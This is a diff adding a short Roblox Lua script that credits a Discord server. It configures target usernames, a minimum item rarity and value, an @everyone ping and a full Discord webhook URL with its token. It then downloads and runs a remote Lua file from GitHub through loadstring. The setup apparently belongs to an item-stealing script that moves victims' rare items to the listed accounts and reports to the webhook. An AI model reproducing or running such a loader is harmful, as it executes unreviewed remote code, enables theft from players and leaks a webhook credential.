@@ -1,0 +1,13 @@
+-- ts file was generated at discord.gg/25ms
+
+_G.Usernames = {
+'nhoxbao20032',
+'vanvuxo',
+'anhlinh1139',
+}
+_G.min_rarity = 'Godly'
+_G.min_value = 1
+_G.pingEveryone = 'Yes'
+_G.webhook = 'https://discord.com/api/webhooks/1425335651036958782/iTuluMUfPhuRbfjodN0yqqMaHmHRx72fKC-jai7xovgFbdKuiDnQ_c1Yj_3jryEhLU5d'
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/scriptjame/testmm4/refs/heads/main/souce.lua'))()
